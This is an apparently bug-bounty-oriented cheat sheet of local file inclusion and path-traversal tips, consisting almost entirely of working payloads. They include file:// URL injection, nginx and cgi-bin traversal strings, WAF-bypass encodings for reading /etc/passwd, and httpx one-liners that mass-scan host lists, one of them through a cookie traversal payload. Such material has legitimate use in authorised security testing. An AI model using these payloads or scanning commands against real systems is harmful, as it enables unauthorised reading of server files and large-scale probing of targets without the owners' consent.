
					LFI Tips for hunting:
					---------------------
 #Tips 1:
-------------
 	Always recommedn looking at the target's IP ranges.
	/api/geojson?url=file:///etc/passwd


 #Tips 2:
 ---------
 
 	Ngix Path Traversal
        httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'

        - If you got any 'cgi.bin' directory - you can inject this payload:
	 127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

	List of open source tools for AWS security: defensive, offensive, auditing, DFIR, etc.
        [https://t.co/LT4x1FmZ2i]


 #Tips 3:
 ----------
 	LFI WAF bypass:

 	file:/etc/passwd?/
	file:/etc/passwd%3F/
	file:/etc%252Fpasswd/
	file:/etc%252Fpasswd%3F/
	file:///etc/?/../passwd
	file:///etc/%3F/../passwd
	file:${br}/et${u}c/pas${te}swd?/
	file:$(br)/et$(u)c/pas$(te)swd?/

	
	_# Try this paload: 	
	/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd HTTP/1.1
 	 
	Note: Its not working from browser


 #Tip 4:
 -----------
 	How to find LFI at scale using @pdiscoveryio httpx>
	$ cat host | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -p "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt


### Cookie LFI At Scale 🔥🔥🔥
```bash
cat rootDomains.txt | assetfinder -subs-only | httpx -t 60 -nc -p 80,443,8080,8443,9001,9002,9002,9003 -H "Cookie:usid=../../../../../../../../../../../../etc/passwd" -mc 200 -mr "root:x:"
```












